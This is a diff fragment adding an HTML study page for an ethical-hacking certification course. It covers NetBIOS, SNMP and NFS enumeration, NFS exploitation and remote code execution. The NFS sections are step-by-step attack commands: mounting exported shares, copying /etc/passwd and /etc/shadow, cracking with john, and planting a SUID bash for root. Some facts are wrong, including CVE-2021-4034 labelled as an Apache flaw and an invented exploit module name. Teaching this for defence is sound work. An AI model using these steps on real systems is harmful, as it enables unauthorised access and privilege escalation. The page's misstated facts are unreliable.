+                            <li>Running on Ubuntu Linux</li>
+                            <li>PHP 7.4.3 is installed and enabled</li>
+                            <li>Can search for exploits for these versions</li>
+                            <li>Can test for known vulnerabilities</li>
+                        </ul>
+                    </div>
+
+                    <div class="box box-theory" style="margin-top: 15px;">
+                        <h4 style="margin-top: 0;">Vulnerability Chain Example</h4>
+                        <ol style="margin: 10px 0 0 20px;">
+                            <li><strong>Find:</strong> Apache 2.4.41 running  → curl/wget</li>
+                            <li><strong>Know:</strong> CVE-2021-4034 affects Apache 2.2-2.4</li>
+                            <li><strong>Search:</strong> Metasploit for matching exploit</li>
+                            <li><strong>Execute:</strong> Found exploit_apache_buffer_overflow</li>
+                            <li><strong>Compromise:</strong> Remote code execution achieved</li>
+                        </ol>
+                    </div>
+                </div>
+            </div>
+
+            <!-- NetBIOS Enumeration Tab -->
+            <div id="netbios-enum" class="tab-content">
+                <h2>🖥️ NetBIOS Enumeration</h2>
+                
+                <div class="card fade-in">
+                    <h3>What is NetBIOS?</h3>
+                    
+                    <div class="definition">
+                        <strong>NetBIOS (Network Basic Input Output System):</strong> A network service that allows applications on different computers to communicate with each other. Primarily used for Windows file and printer sharing. NetBIOS name is essentially your computer name on the network.
+                    </div>
+
+                    <p style="margin-top: 20px;"><strong>NetBIOS vs Other Naming Systems:</strong></p>
+                    <table>
+                        <thead>
+                            <tr>
+                                <th>System</th>
+                                <th>Name Type</th>
+                                <th>OS</th>
+                                <th>Example</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            <tr>
+                                <td><strong>NetBIOS</strong></td>
+                                <td>Computer name (15 characters)</td>
+                                <td>Windows</td>
+                                <td>MYCOMPUTER or DESKTOP-ABC1234</td>
+                            </tr>
+                            <tr>
+                                <td><strong>Hostname</strong></td>
+                                <td>DNS hostname</td>
+                                <td>Linux/Unix</td>
+                                <td>mycomputer.example.com</td>
+                            </tr>
+                            <tr>
+                                <td><strong>FQDN</strong></td>
+                                <td>Fully qualified domain name</td>
+                                <td>Any</td>
+                                <td>pc1.corp.example.com</td>
+                            </tr>
+                        </tbody>
+                    </table>
+                </div>
+
+                <div class="card fade-in">
+                    <h3>NetBIOS Ports and Protocols</h3>
+                    
+                    <table>
+                        <thead>
+                            <tr>
+                                <th>Port</th>
+                                <th>Service</th>
+                                <th>Protocol</th>
+                                <th>Purpose</th>
+                                <th>Danger Level</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            <tr>
+                                <td><strong>137</strong></td>
+                                <td>NetBIOS Name Service</td>
+                                <td>UDP</td>
+                                <td>Name resolution on local network</td>
+                                <td>⭐⭐⭐ High</td>
+                            </tr>
+                            <tr>
+                                <td><strong>138</strong></td>
+                                <td>NetBIOS Datagram Service</td>
+                                <td>UDP</td>
+                                <td>Messages sent without connection</td>
+                                <td>⭐⭐⭐ High</td>
+                            </tr>
+                            <tr>
+                                <td><strong>139</strong></td>
+                                <td>NetBIOS Session Service</td>
+                                <td>TCP</td>
+                                <td>File/printer sharing over NetBIOS</td>
+                                <td>⭐⭐⭐⭐ Critical</td>
+                            </tr>
+                            <tr>
+                                <td><strong>445</strong></td>
+                                <td>SMB (Server Message Block)</td>
+                                <td>TCP</td>
+                                <td>Modern file/printer sharing (Windows)</td>
+                                <td>⭐⭐⭐⭐ Critical</td>
+                            </tr>
+                        </tbody>
+                    </table>
+
+                    <div class="box box-warning" style="margin-top: 20px;">
+                        <h4 style="margin-top: 0;">⚠️ Critical Ports 139 & 445</h4>
+                        <ul style="margin: 10px 0 0 20px;">
+                            <li><strong>Port 139:</strong> NetBIOS Session - Direct access to shares over NetBIOS</li>
+                            <li><strong>Port 445:</strong> SMB - Modern file sharing protocol</li>
+                            <li><strong>Together:</strong> Allow complete file and printer access</li>
+                            <li><strong>Default Share:</strong> Admin$ (C: drive accessible), IPC$ (inter-process communication)</li>
+                            <li><strong>If open:</strong> Attacker can copy files, upload malware, access entire system</li>
+                        </ul>
+                    </div>
+                </div>
+
+                <div class="card fade-in">
+                    <h3>NetBIOS Enumeration Commands</h3>
+                    
+                    <div class="box box-theory">
+                        <h4 style="margin-top: 0;">Windows: NBTStat Command</h4>
+                        <p><strong>Command:</strong> <code style="background: rgba(0,0,0,0.2); padding: 2px 6px;">nbtstat -A [IP_ADDRESS]</code></p>
+                        <p style="margin-top: 10px;"><strong>What it reveals:</strong></p>
+                        <ul style="margin: 10px 0 0 20px;">
+                            <li>NetBIOS name of the computer</li>
+                            <li>Workgroup/Domain name</li>
+                            <li>MAC address</li>
+                            <li>All registered NetBIOS names</li>
+                        </ul>
+                        <code style="background: rgba(0,0,0,0.3); padding: 8px; display: block; border-radius: 3px; margin-top: 8px; font-size: 0.85em;">
+nbtstat -A 192.168.1.90<br>
+<br>
+Output:<br>
+Name: DESKTOP-ABCD1234<br>
+Workgroup: WORKGROUP<br>
+MAC Address: 00-0A-95-9D-68-16
+                        </code>
+                    </div>
+
+                    <div class="box box-theory" style="margin-top: 15px;">
+                        <h4 style="margin-top: 0;">Windows: Net View</h4>
+                        <p><strong>Command:</strong> <code style="background: rgba(0,0,0,0.2); padding: 2px 6px;">net view</code></p>
+                        <p style="margin-top: 10px;"><strong>Lists all computers in the workgroup/domain</strong></p>
+                        <code style="background: rgba(0,0,0,0.3); padding: 8px; display: block; border-radius: 3px; margin-top: 8px; font-size: 0.85em;">
+net view<br>
+<br>
+Server Name           Remark<br>
+\\DESKTOP-ABC        PC1<br>
+\\LAPTOP-123         Laptop<br>
+\\SERVER-MAIL        Mail Server
+                        </code>
+                    </div>
+
+                    <div class="box box-concept" style="margin-top: 15px;">
+                        <h4 style="margin-top: 0;">Linux: NBTScan</h4>
+                        <p><strong>Command:</strong> <code style="background: rgba(0,0,0,0.2); padding: 2px 6px;">nbtscan -r 192.168.1.0/24</code></p>
+                        <p style="margin-top: 10px;"><strong>Scans network range for NetBIOS names</strong></p>
+                        <code style="background: rgba(0,0,0,0.3); padding: 8px; display: block; border-radius: 3px; margin-top: 8px; font-size: 0.85em;">
+nbtscan -r 192.168.1.0/24<br>
+<br>
+192.168.1.50  DESKTOP-ABC1234   WORKGROUP<br>
+192.168.1.88  DBSERVER         CORP<br>
+192.168.1.75  MAILSERVER       CORP
+                        </code>
+                    </div>
+
+                    <div class="box box-concept" style="margin-top: 15px;">
+                        <h4 style="margin-top: 0;">RPC Client (Enumeration)</h4>
+                        <p><strong>Command:</strong> <code style="background: rgba(0,0,0,0.2); padding: 2px 6px;">rpcclient -U "" 192.168.1.50</code></p>
+                        <p style="margin-top: 10px;"><strong>Advanced enumeration using RPC protocol</strong></p>
+                        <code style="background: rgba(0,0,0,0.3); padding: 8px; display: block; border-radius: 3px; margin-top: 8px; font-size: 0.85em;">
+rpcclient $> getusers<br>
+user:[Administrator] rid:[0x1f4]<br>
+user:[Guest] rid:[0x1f5]<br>
+user:[VictimUser] rid:[0x3e8]
+                        </code>
+                    </div>
+                </div>
+            </div>
+
+            <!-- SNMP Enumeration Tab -->
+            <div id="snmp-enum" class="tab-content">
+                <h2>📊 SNMP Enumeration</h2>
+                
+                <div class="card fade-in">
+                    <h3>What is SNMP?</h3>
+                    
+                    <div class="definition">
+                        <strong>SNMP (Simple Network Management Protocol):</strong> A protocol for collecting and organizing information about managed devices (routers, switches, servers, printers) on IP networks. Used for monitoring and managing network performance.
+                    </div>
+
+                    <p style="margin-top: 20px;"><strong>Key SNMP Characteristics:</strong></p>
+                    <div class="grid-2">
+                        <div class="box box-concept">
+                            <h4 style="margin-top: 0;">Basics</h4>
+                            <ul style="margin: 10px 0 0 20px;">
+                                <li>Port: UDP 161 (default)</li>
+                                <li>Protocol: UDP (connectionless)</li>
+                                <li>Purpose: Network monitoring/management</li>
+                                <li>Uses agents on devices</li>
+                            </ul>
+                        </div>
+
+                        <div class="box box-example">
+                            <h4 style="margin-top: 0;">Danger</h4>
+                            <ul style="margin: 10px 0 0 20px;">
+                                <li>Often left with default community strings</li>
+                                <li>Reveals extensive system info</li>
+                                <li>Can leak credentials</li>
+                                <li>No authentication required (old SNMP v1)</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="card fade-in">
+                    <h3>SNMP Community Strings</h3>
+                    
+                    <div class="box box-warning">
+                        <h4 style="margin-top: 0;">Default Community Strings (VULNERABILITIES)</h4>
+                        <p><strong>Public (Read-Only):</strong> <code style="background: rgba(0,0,0,0.2); padding: 2px 6px;">"public"</code></p>
+                        <p>Default community string for read-only access</p>
+                        
+                        <p style="margin-top: 10px;"><strong>Private (Read-Write):</strong> <code style="background: rgba(0,0,0,0.2); padding: 2px 6px;">"private"</code></p>
+                        <p>Default community string for read-write access</p>
+
+                        <p style="margin-top: 10px;"><strong>Commonly Found:</strong></p>
+                        <ul style="margin: 10px 0 0 20px; font-size: 0.9em;">
+                            <li>"public" - Public is the most common</li>
+                            <li>"private" - Often unguarded</li>
+                            <li>"manager" - Sometimes used</li>
+                            <li>Company names - BP, Shell, etc.</li>
+                        </ul>
+
+                        <p style="margin-top: 10px; color: var(--danger);"><strong>⚠️ Danger:</strong> Many organizations never change defaults!</p>
+                    </div>
+                </div>
+
+                <div class="card fade-in">
+                    <h3>SNMP Enumeration Process</h3>
+                    
+                    <div class="box box-theory">
+                        <h4 style="margin-top: 0;">Step 1: Identify SNMP on Target</h4>
+                        <code style="background: rgba(0,0,0,0.3); padding: 8px; display: block; border-radius: 3px; font-size: 0.85em;">
+nmap -sU -p 161 192.168.1.0/24<br>
+<br>
+Output:<br>
+192.168.1.88     161/udp  open  snmp
+                        </code>
+                        <p style="margin-top: 10px;"><strong>Finding:</strong> SNMP daemon is running and accessible</p>
+                    </div>
+
+                    <div class="box box-theory" style="margin-top: 15px;">
+                        <h4 style="margin-top: 0;">Step 2: Enumerate with Default Strings</h4>
+                        <code style="background: rgba(0,0,0,0.3); padding: 8px; display: block; border-radius: 3px; font-size: 0.85em;">
+nmap -sU -p 161 --script snmp-info 192.168.1.88<br>
+<br>
+Output shows if SNMP is accessible
+                        </code>
+                    </div>
+
+                    <div class="box theory" style="margin-top: 15px;">
+                        <h4 style="margin-top: 0;">Step 3: Extract Information</h4>
+                        <code style="background: rgba(0,0,0,0.3); padding: 8px; display: block; border-radius: 3px; font-size: 0.85em;">
+snmp-check -t 192.168.1.88<br>
+snmpwalk -c public 192.168.1.88 1<br>
+<br>
+Extracts extensive system information
+                        </code>
+                    </div>
+                </div>
+
+                <div class="card fade-in">
+                    <h3>Information Extracted via SNMP</h3>
+                    
+                    <div class="grid-2">
+                        <div class="box box-warning">
+                            <h4 style="margin-top: 0;">Hardware Information</h4>
+                            <ul style="margin: 10px 0 0 20px;">
+                                <li>Processor type and count</li>
+                                <li>Memory (RAM) size and usage</li>
+                                <li>Disk drives and capacity</li>
+                                <li>Network adapters</li>
+                                <li>Device manufacturer</li>
+                            </ul>
+                        </div>
+
+                        <div class="box box-warning">
+                            <h4 style="margin-top: 0;">System Information</h4>
+                            <ul style="margin: 10px 0 0 20px;">
+                                <li>Operating system version</li>
+                                <li>System uptime (in ticks)</li>
+                                <li>Computer name</li>
+                                <li>System date/time</li>
+                                <li>Users logged in</li>
+                            </ul>
+                        </div>
+
+                        <div class="box box-example">
+                            <h4 style="margin-top: 0;">Software Information</h4>
+                            <ul style="margin: 10px 0 0 20px;">
+                                <li>Running processes</li>
+                                <li>Installed applications</li>
+                                <li>Services enabled</li>
+                                <li>Network shares</li>
+                                <li>Open ports</li>
+                            </ul>
+                        </div>
+
+                        <div class="box box-example">
+                            <h4 style="margin-top: 0;">Network Information</h4>
+                            <ul style="margin: 10px 0 0 20px;">
+                                <li>IP addresses and subnets</li>
+                                <li>Routing table</li>
+                                <li>Interface statistics</li>
+                                <li>ARP table</li>
+                                <li>DNS servers</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- NFS Enumeration Tab -->
+            <div id="nfs-enum" class="tab-content">
+                <h2>📂 NFS Enumeration</h2>
+                
+                <div class="card fade-in">
+                    <h3>What is NFS?</h3>
+                    
+                    <div class="definition">
+                        <strong>NFS (Network File System):</strong> A protocol allowing computers to share file systems over a network, as if the files were local. Primarily used on Linux/Unix systems for sharing directories. Critical difference from SMB (Windows) - NFS is lighter weight but can be poorly configured.
+                    </div>
+
+                    <p style="margin-top: 20px;"><strong>NFS vs SMB:</strong></p>
+                    <table>
+                        <thead>
+                            <tr>
+                                <th>Aspect</th>
+                                <th>NFS</th>
+                                <th>SMB</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            <tr>
+                                <td><strong>OS</strong></td>
+                                <td>Linux/Unix</td>
+                                <td>Windows (SMBv1-v3)</td>
+                            </tr>
+                            <tr>
+                                <td><strong>Port</strong></td>
+                                <td>111 (RPC), 2049 (NFS)</td>
+                                <td>139, 445</td>
+                            </tr>
+                            <tr>
+                                <td><strong>Protocol</strong></td>
+                                <td>RPC-based</td>
+                                <td>NetBIOS/Direct TCP</td>
+                            </tr>
+                            <tr>
+                                <td><strong>Authentication</strong></td>
+                                <td>UID/GID based</td>
+                                <td>Username/Password</td>
+                            </tr>
+                            <tr>
+                                <td><strong>Encryption</strong></td>
+                                <td>None (NFSv3), optional (NFSv4)</td>
+                                <td>Kerberos/NTLM</td>
+                            </tr>
+                        </tbody>
+                    </table>
+                </div>
+
+                <div class="card fade-in">
+                    <h3>NFS Enumeration Commands</h3>
+                    
+                    <div class="box box-theory">
+                        <h4 style="margin-top: 0;">Step 1: Find NFS Port</h4>
+                        <code style="background: rgba(0,0,0,0.3); padding: 8px; display: block; border-radius: 3px; font-size: 0.85em;">
+nmap -sV -p 111 192.168.1.0/24<br>
+<br>
+Output:<br>
+111/tcp open  rpcbind
+                        </code>
+                    </div>
+
+                    <div class="box box-theory" style="margin-top: 15px;">
+                        <h4 style="margin-top: 0;">Step 2: List NFS Shares</h4>
+                        <code style="background: rgba(0,0,0,0.3); padding: 8px; display: block; border-radius: 3px; font-size: 0.85em;">
+showmount -e 192.168.1.88<br>
+<br>
+Output (shows what's exported from target):<br>
+Export list for 192.168.1.88:<br>
+/root        (everyone)<br>
+/home        (everyone)<br>
+/var/backup  (everyone)
+                        </code>
+                    </div>
+
+                    <div class="box box-concept" style="margin-top: 15px;">
+                        <h4 style="margin-top: 0;">Step 3: Mount and Access</h4>
+                        <code style="background: rgba(0,0,0,0.3); padding: 8px; display: block; border-radius: 3px; font-size: 0.85em;">
+# Create mount point<br>
+mkdir /mnt/nfs_target<br>
+<br>
+# Mount the share<br>
+mount -t nfs 192.168.1.88:/root /mnt/nfs_target<br>
+<br>
+# Browse the remote files<br>
+ls -la /mnt/nfs_target
+                        </code>
+                    </div>
+                </div>
+
+                <div class="card fade-in">
+                    <h3>NFS Vulnerability: No Authentication</h3>
+                    
+                    <div class="box box-warning">
+                        <h4 style="margin-top: 0;">The Core Problem</h4>
+                        <p><strong>Traditional NFS (v3):</strong> No authentication mechanism! Access is based on IP addresses and UIDs</p>
+                        
+                        <p style="margin-top: 10px;"><strong>How Exploitation Works:</strong></p>
+                        <ol style="margin: 10px 0 0 20px;">
+                            <li><strong>Step 1:</strong> Find NFS shares using showmount</li>
+                            <li><strong>Step 2:</strong> Permissions say "root" (UID 0) can read all</li>
+                            <li><strong>Step 3:</strong> Attacker sets their UID to 0</li>
+                            <li><strong>Step 4:</strong> Mount the share, full access automatically granted</li>
+                            <li><strong>Step 5:</strong> Browse/modify/copy critical files</li>
+                            <li><strong>Step 6:</strong> Can even create SUID binaries</li>
+                        </ol>
+                    </div>
+
+                    <div class="box box-example" style="margin-top: 15px;">
+                        <h4 style="margin-top: 0;">Practical Attack: Copy /etc/passwd</h4>
+                        <code style="background: rgba(0,0,0,0.3); padding: 8px; display: block; border-radius: 3px; font-size: 0.85em;">
+# After mounting /root share<br>
+cp /mnt/nfs_target/etc/passwd .<br>
+<br>
+# Now attacker has password hashes!<br>
+# Can crack with John or Hashcat<br>
+john --wordlist=/usr/share/wordlists/rockyou.txt passwd.txt
+                        </code>
+                    </div>
+                </div>
+            </div>
+
+            <!-- NFS Exploitation Tab -->
+            <div id="nfs-exploit" class="tab-content">
+                <h2>⚔️ NFS Exploitation: Full Access</h2>
+                
+                <div class="card fade-in">
+                    <h3>Complete NFS Exploitation Attack</h3>
+                    
+                    <div class="timeline">
+                        <div class="timeline-item fade-in">
+                            <div class="timeline-date">Stage 1: Discovery</div>
+                            <p>Find NFS service running on target network</p>
+                        </div>
+                        <div class="timeline-item fade-in">
+                            <div class="timeline-date">Stage 2: Enumeration</div>
+                            <p>List exported shares and permissions</p>
+                        </div>
+                        <div class="timeline-item fade-in">
+                            <div class="timeline-date">Stage 3: Access</div>
+                            <p>Mount shares locally with no authentication</p>
+                        </div>
+                        <div class="timeline-item fade-in">
+                            <div class="timeline-date">Stage 4: Exploitation</div>
+                            <p>Access sensitive files and data</p>
+                        </div>
+                        <div class="timeline-item fade-in">
+                            <div class="timeline-date">Stage 5: Privilege Escalation</div>
+                            <p>Create SUID binaries for local root</p>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="card fade-in">
+                    <h3>Detailed Attack Walkthrough</h3>
+                    
+                    <div class="box box-theory">
+                        <h4 style="margin-top: 0;">Step 1-3: Discovery & Mounting</h4>
+                        <code style="background: rgba(0,0,0,0.3); padding: 8px; display: block; border-radius: 3px; font-size: 0.85em; line-height: 1.6;">
+# Reconnaissance<br>
+┌─[attacker]─[/tmp]<br>
+└──╼ $ nmap -sV -p 111 192.168.1.88<br>
+111/tcp  open  rpcbind<br>
+<br>
+# Enumerate NFS<br>
+┌─[attacker]─[/tmp]<br>
+└──╼ $ showmount -e 192.168.1.88<br>
+Export list for 192.168.1.88:<br>
+/root        (everyone)<br>
+/home        (everyone)<br>
+<br>
+# Create mount point<br>
+mkdir /mnt/nfs_root<br>
+mkdir /mnt/nfs_home<br>
+<br>
+# Mount the shares<br>
+mount -t nfs 192.168.1.88:/root /mnt/nfs_root<br>
+mount -t nfs 192.168.1.88:/home /mnt/nfs_home
+                        </code>
+                    </div>
+
+                    <div class="box box-example" style="margin-top: 15px;">
+                        <h4 style="margin-top: 0;">Step 4: Browse and Extract Files</h4>
+                        <code style="background: rgba(0,0,0,0.3); padding: 8px; display: block; border-radius: 3px; font-size: 0.85em; line-height: 1.6;">
+# List contents of remote root<br>
+ls -la /mnt/nfs_root/<br>
+<br>
+drwxr-xr-x  root   root   4096  etc<br>
+drwxr-xr-x  root   root   4096  home<br>
+drwxr-xr-x  root   root   4096  hackers<br>
+drwxr-xr-x  root   root   4096  var<br>
+<br>
+# Access sensitive files<br>
+cat /mnt/nfs_root/etc/passwd<br>
+cat /mnt/nfs_root/etc/shadow (if readable!)<br>
+<br>
+# Copy important files<br>
+cp -r /mnt/nfs_root/etc ~/compromised_etc<br>
+cp -r /mnt/nfs_root/home ~/compromised_home
+                        </code>
+                        <p style="margin-top: 10px; font-size: 0.9em;"><strong>Result:</strong> Complete read access to remote filesystem!</p>
+                    </div>
+
+                    <div class="box box-warning" style="margin-top: 15px;">
+                        <h4 style="margin-top: 0;">Step 5: Privilege Escalation via SUID</h4>
+                        <code style="background: rgba(0,0,0,0.3); padding: 8px; display: block; border-radius: 3px; font-size: 0.85em; line-height: 1.6;">
+# Create SUID binary to escalate privileges<br>
+# Copy /bin/bash to NFS mount<br>
+cp /bin/bash /mnt/nfs_root/bin/bash_suid<br>
+<br>
+# Set SUID bit (this runs as root when executed)<br>
+chmod 4777 /mnt/nfs_root/bin/bash_suid<br>
+<br>
+# From victim machine (or RCE shell):<br>
+# Execute the SUID bash<br>
+/bin/bash_suid -p<br>
+<br>
+# Now running as ROOT!<br>
+id<br>
+uid=0(root) gid=0(root) groups=0(root)
+                        </code>
+                        <p style="margin-top: 10px; font-size: 0.9em; color: var(--danger);"><strong>Result:</strong> Complete system compromise!</p>
+                    </div>
+                </div>
+
+                <div class="card fade-in">
+                    <h3>Why NFS is So Dangerous</h3>
+                    
+                    <div class="box box-warning">
+                        <h4 style="margin-top: 0;">The Perfect Attack Vector</h4>
+                        <ul style="margin: 10px 0 0 20px;">
+                            <li><strong>No credentials required:</strong> IP-based authentication only</li>
+                            <li><strong>No encryption:</strong> Data sent in clear text</li>
+                            <li><strong>Full file system access:</strong> Can browse everything</li>
+                            <li><strong>Write access:</strong> Can modify files if permissions allow</li>
+                            <li><strong>Privilege escalation:</strong> SUID binaries lead to root</li>
+                            <li><strong>Often misconfigured:</strong> Exported to "everyone"</li>
+                            <li><strong>Forgotten by admins:</strong> Set up once, never reviewed</li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+
+            <!-- RCE Introduction Tab -->
+            <div id="rce-intro" class="tab-content">
+                <h2>💥 Remote Code Execution (RCE)</h2>
+                
+                <div class="card fade-in">
+                    <h3>What is RCE?</h3>
+                    <div class="definition">
+                        <strong>Remote Code Execution (RCE):</strong> The ability to execute arbitrary commands or code on a target system from a remote location. The "holy grail" of hacking - once you have RCE, you essentially own the system.
+                    </div>
+
+                    <p style="margin-top: 20px;"><strong>Path to RCE in Attack Chain:</strong></p>
+                    <div class="timeline">
+                        <div class="timeline-item fade-in">
+                            <div class="timeline-date">Stage 1: Scanning</div>
+                            <p>Find open ports and services</p>
+                        </div>
+                        <div class="timeline-item fade-in">
+                            <div class="timeline-date">Stage 2: Banner Grabbing</div>
+                            <p>Identify software versions</p>
+                        </div>
+                        <div class="timeline-item fade-in">
+                            <div class="timeline-date">Stage 3: Find Vulnerability</div>
+                            <p>Search CVE database for version exploits</p>
+                        </div>
+                        <div class="timeline-item fade-in">
+                            <div class="timeline-date">Stage 4: Exploit</div>
+                            <p>Execute code on target</p>
+                        </div>
+                        <div class="timeline-item fade-in">
+                            <div class="timeline-date">Stage 5: RCE Achieved</div>
+                            <p>Have command execution on target</p>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="card fade-in">
+                    <h3>Types of RCE</h3>
+                    
+                    <div class="grid-2">
+                        <div class="box box-warning">
+                            <h4 style="margin-top: 0;">RCE via Vulnerable Service</h4>
+                            <p><strong>Example:</strong> Apache 2.2.8 buffer overflow</p>
+                            <p><strong>Process:</strong></p>
+                            <ul style="margin: 10px 0 0 20px;">
+                                <li>Banner grab reveals Apache 2.2.8</li>
+                                <li>Search: "Apache 2.2.8 exploit"</li>
+                                <li>Find Metasploit module</li>
+                                <li>Execute exploit module</li>
+                                <li>Get shell on web server</li>
+                            </ul>
+                        </div>
+
+                        <div class="box box-example">
+                            <h4 style="margin-top: 0;">RCE via Upload</h4>
+                            <p><strong>Example:</strong> Unrestricted file upload on web app</p>
+                            <p><strong>Process:</strong></p>
+                            <ul style="margin: 10px 0 0 20px;">
+                                <li>Find upload functionality</li>
+                                <li>Bypass filters (change extension)</li>
+                                <li>Upload web shell (PHP/ASP)</li>
+                                <li>Access shell via web browser</li>
+                                <li>Execute commands through web shell</li>
+                            </ul>
+                        </div>
+
+                        <div class="box box-example">
+                            <h4 style="margin-top: 0;">RCE via Injection</h4>
+                            <p><strong>Example:</strong> SQL injection leading to command execution</p>
+                            <p><strong>Process:</strong></p>
+                            <ul style="margin: 10px 0 0 20px;">
+                                <li>Find SQL injection vulnerability</li>
+                                <li>Use stacked queries</li>
+                                <li>Execute system commands</li>
+                                <li>Get reverse shell</li>
+                            </ul>
+                        </div>
+
+                        <div class="box box-theory">
+                            <h4 style="margin-top: 0;">RCE via Privilege Escalation</h4>
+                            <p><strong>Example:</strong> Local privilege escalation after initial access</p>
+                            <p><strong>Process:</strong></p>
+                            <ul style="margin: 10px 0 0 20px;">
+                                <li>Have low-privilege shell</li>
+                                <li>Find local privilege escalation</li>
+                                <li>Exploit to gain root/admin</li>
+                                <li>Now have admin RCE</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Summary Tab -->
+            <div id="summary-4ceh" class="tab-content">
+                <h2>📋 4_CEH: Complete Summary</h2>
+                
+                <div class="card fade-in">
+                    <h3>Complete Attack Progression</h3>
+                    
+                    <div class="timeline">
+                        <div class="timeline-item fade-in">
+                            <div class="timeline-date">1_CEH - Passive Footprinting</div>
+                            <p>Public sources, no target interaction</p>
+                        </div>
+                        <div class="timeline-item fade-in">
+                            <div class="timeline-date">2_CEH - DNS Enumeration</div>
+                            <p>Subdomain discovery, DNS records</p>
+                        </div>
+                        <div class="timeline-item fade-in">
+                            <div class="timeline-date">3_CEH - Network Scanning</div>
+                            <p>NMAP scanning, port discovery</p>
+                        </div>
+                        <div class="timeline-item fade-in">
+                            <div class="timeline-date">4_CEH - Enumeration & Banners</div>
+                            <p><strong>→ CURRENT: Active enumeration, service identification, initial exploitation</strong></p>
+                        </div>
+                        <div class="timeline-item fade-in">
+                            <div class="timeline-date">5_CEH+ - Full Exploitation</div>
+                            <p>Remote code execution, system compromise</p>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="card fade-in">
+                    <h3>Key Techniques Learned</h3>
+                    
+                    <div class="grid-2">
+                        <div class="box box-theory">
+                            <h4 style="margin-top: 0;">Fingerprinting</h4>
+                            <ul style="margin: 10px 0 0 20px;">
+                                <li>TTL values for OS detection</li>
+                                <li>Port signatures</li>
+                                <li>Service banners</li>
+                                <li>HTTP headers analysis</li>
+                            </ul>
+                        </div>
+
+                        <div class="box box-theory">
+                            <h4 style="margin-top: 0;">Banner Grabbing Tools</h4>
+                            <ul style="margin: 10px 0 0 20px;">
+                                <li>Whois, Curl, Wget</li>
+                                <li>Nikto web scanner</li>
+                                <li>Dmitri info tool</li>
+                                <li>Telnet/Netcat</li>
+                            </ul>
+                        </div>
+
+                        <div class="box box-concept">
+                            <h4 style="margin-top: 0;">Enumeration Protocols</h4>
+                            <ul style="margin: 10px 0 0 20px;">
+                                <li>NetBIOS (137, 138, 139, 445)</li>
+                                <li>SNMP (161/UDP)</li>
+                                <li>NFS (111/RPC, 2049)</li>
+                                <li>SMTP, DNS, RPC</li>
+                            </ul>
+                        </div>
+
+                        <div class="box box-example">
+                            <h4 style="margin-top: 0;">Exploitation Basics</h4>
+                            <ul style="margin: 10px 0 0 20px;">
+                                <li>RCE concept & importance</li>
+                                <li>NFS exploitation methods</li>
+                                <li>SUID privilege escalation</li>
+                                <li>Attack chain understanding</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="card fade-in">
+                    <h3>Quick Reference: Most Dangerous Ports</h3>
+                    
+                    <table>
+                        <thead>
+                            <tr>
+                                <th>Port</th>
+                                <th>Service</th>
+                                <th>Danger</th>
+                                <th>Why</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            <tr>
+                                <td><strong>139</strong></td>
+                                <td>NetBIOS Session (SMB)</td>
+                                <td>⭐⭐⭐⭐⭐</td>
+                                <td>Complete file access, no auth</td>
+                            </tr>
+                            <tr>
+                                <td><strong>445</strong></td>
+                                <td>SMB (Modern)</td>
+                                <td>⭐⭐⭐⭐⭐</td>
+                                <td>Same as 139, direct access</td>
+                            </tr>
+                            <tr>
+                                <td><strong>111</strong></td>
+                                <td>RPC/NFS</td>
+                                <td>⭐⭐⭐⭐⭐</td>
+                                <td>NFS exports full file system</td>
+                            </tr>
+                            <tr>
+                                <td><strong>161</strong></td>
+                                <td>SNMP</td>
+                                <td>⭐⭐⭐⭐</td>
+                                <td>Massive info leak, often unprotected</td>
+                            </tr>
+                            <tr>
+                                <td><strong>22</strong></td>
+                                <td>SSH</td>
+                                <td>⭐⭐⭐</td>
+                                <td>Password brute force target</td>
+                            </tr>
+                            <tr>
+                                <td><strong>3306</strong></td>
+                                <td>MySQL</td>
+                                <td>⭐⭐⭐⭐</td>
+                                <td>Often exposed to network</td>
+                            </tr>
+                        </tbody>
+                    </table>
+                </div>
+
+                <div class="card fade-in">
+                    <h3>Enumeration Success Factors</h3>
+                    
+                    <div class="grid-2">
+                        <div class="box box-warning">
+                            <h4 style="margin-top: 0;">✓ When Enumeration Succeeds</h4>
+                            <ul style="margin: 10px 0 0 20px;">
+                                <li>Services use default credentials</li>
+                                <li>No authentication required</li>
+                                <li>Overly permissive shares/exports</li>
+                                <li>Information not restricted</li>
+                                <li>Legacy protocols enabled</li>
+                            </ul>
+                        </div>
+
+                        <div class="box box-theory">
+                            <h4 style="margin-top: 0;">Next: 5_CEH Topics</h4>
+                            <ul style="margin: 10px 0 0 20px;">
+                                <li>Metasploit framework</li>
+                                <li>Exploit execution</li>
+                                <li>Payload delivery</li>
+                                <li>Post-exploitation</li>
+                                <li>Command & control</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </main>
+    </div>
+
+    <!-- Scroll to Top Button -->
+    <button class="scroll-top" onclick="scrollToTop()">↑</button>
+
+    <script>
+        function switchTab(tabName) {
+            document.querySelectorAll('.tab-content').forEach(el => {
+                el.classList.remove('active');
+            });
+            
+            const tab = document.getElementById(tabName);
+            if (tab) tab.classList.add('active');
+            
+            const breadcrumbMap = {
+                'overview': 'Overview',
+                'os-fingerprinting': 'OS Fingerprinting',
+                'banner-grabbing': 'Banner Grabbing',
+                'enumeration-intro': 'Enumeration Intro',
+                'banner-tools': 'Banner Tools',
+                'curl-wget': 'Curl & Wget',
+                'nikto-dmitri': 'Nikto & Dmitri',
+                'netbios-enum': 'NetBIOS Enumeration',
+                'snmp-enum': 'SNMP Enumeration',
+                'nfs-enum': 'NFS Enumeration',
+                'smtp-dns-enum': 'SMTP & DNS',
+                'smb-enum': 'SMB Enumeration',
+                'nfs-exploit': 'NFS Exploitation',
+                'rce-intro': 'RCE Introduction',
+                'attack-vectors': 'Attack Vectors',
+                'summary-4ceh': 'Summary & Recap'
+            };
+            
+            document.getElementById('breadcrumb-current').textContent = breadcrumbMap[tabName] || 'Overview';
+            
+            document.querySelectorAll('.sidebar-link').forEach(link => {
